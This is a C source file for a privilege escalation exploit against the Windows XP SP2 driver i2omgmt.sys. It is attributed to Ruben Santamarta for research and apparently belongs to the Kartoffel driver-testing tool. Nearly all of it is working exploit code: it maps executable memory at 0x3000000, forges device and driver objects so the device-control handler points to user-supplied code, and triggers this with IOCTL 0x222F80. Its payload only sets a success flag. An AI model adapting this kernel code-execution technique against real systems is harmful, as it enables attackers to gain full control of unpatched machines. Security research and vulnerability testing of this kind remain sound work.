
#include "i2omgmt_plugin.h"

#define DEVICE_OBJECT_SIZE                0x2D
#define MAX_MAJOR                         0x1B
#define MAJOR_OFFSET                      0xE
#define IRP_MJ_DEVICE_CONTROL             0xE
#define STACK_SIZE_OFFSET                 0xC
#define DRIVER_OBJECT_OFFSET              0x2
 
BOOL FlagVulnerable = FALSE;

_declspec(naked) void ShellCode()
{
	_asm{
		mov FlagVulnerable,1
		retn 0x8
	}
}


 int Callback_Overview()
{
	system("cls");
	printf("\n");
	printf("=================================================	\n");
	printf("   Microsoft Windows XP SP2	\n");
	printf("   i2omgmt.sys Privilege Escalation Exploit	\n");
	printf("=================================================	\n");
	printf(" :: Ruben Santamarta - For Research purposes ONLY\n");
	printf("+ References:\n");
	printf("  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=699\n");
	printf("  http://kartoffel.reversemode.com\n\n");
	return 1;
}

int Callback_Direct( char *lpInitStr )
{
 DWORD				*OutBuff,*FakeAddr;		
 DWORD				dwIOCTL,OutSize,junk;
 DWORD              FakeDeviceObject[DEVICE_OBJECT_SIZE];
 DWORD              FakeDriverObject[MAX_MAJOR+MAJOR_OFFSET];
 HANDLE				hDevice;


 Callback_Overview();
  
 hDevice = OpenDevice(L"\\\\.\\I2OExec",
						TRUE,
						FALSE,
						FALSE,
						0,
						0);

if( hDevice == INVALID_HANDLE_VALUE )
{ 
	printf("Driver not found!\n\n Try \"kartoffel.exe -q {path}\\i2omgmt.sys,exploiting\" before executing this exploit.\n\n");
	return FALSE;
}

  printf("[!] Allocating fixed memory at 0x3000000...");
  FakeAddr=(DWORD*)VirtualAlloc((LPVOID)0x3000000
                                ,0x1000
                                ,MEM_COMMIT|MEM_RESERVE
                                ,PAGE_EXECUTE_READWRITE);
  if( FakeAddr != (DWORD*)0x3000000 )
  {
	  printf("\n[**] Error: Unable to allocate memory\n");
	  return 0;
  }
  printf("OK\n");
  
  printf("[!] Adjusting Fake Driver Object\n");
  printf("\t[+] &DriverObject = 0x%p\n",FakeDriverObject);
  printf("\t[+] DriverObject.MajorFunction[IRP_MJ_DEVICE_CONTROL] = 0x%p\n",ShellCode);
  FakeDriverObject[MAJOR_OFFSET+IRP_MJ_DEVICE_CONTROL] = (DWORD)ShellCode;
 
  printf("[!] Adjusting Fake Device Object\n");
  FakeDeviceObject[DRIVER_OBJECT_OFFSET] = (DWORD)FakeDriverObject;
  FakeDeviceObject[STACK_SIZE_OFFSET] = 0x77; 										 // or any value > 0
  printf("\t[+] &DeviceObject = 0x%p\n",FakeDeviceObject);
  printf("\t[+] DeviceObject.DriverObject = 0x%p\n",FakeDriverObject);
  printf("\t[+] DeviceObject.StackSize = 0x%x\n",FakeDeviceObject[STACK_SIZE_OFFSET]);
  
  
  FakeAddr[2] = (DWORD)FakeDeviceObject;
 
 memcpy( (void*)(FakeAddr+0xC), 
         (void*)FakeDeviceObject,
         sizeof(FakeDeviceObject) );
 



//////////////////////
///// INFO 
//////////////////////


 printf("[!] I2OExec Device Handle [%x]\n",hDevice);
 printf("[!] Exploiting...");

//////////////////////
///// BUFFERS
//////////////////////
 OutSize = 0x44;
 OutBuff = (DWORD *)malloc(OutSize);

 //////////////////////
 ///// IOCTL
 //////////////////////

 dwIOCTL = 0x222F80;
 OutBuff[0] = 0x400000;
 
 DeviceIoControl(hDevice, 
                 dwIOCTL, 
                 (LPVOID)OutBuff,0x100,
                 (LPVOID)OutBuff,OutSize,
                 &junk,  
                 NULL);

 if( FlagVulnerable ) 
{
		printf("OK");
		printf("\n\n[+] :: Exploit successfully completed\n");
}else{
		printf("FAILED");
		printf("\n\n[+] :: Nothing found\n");
	}

return FlagVulnerable;
}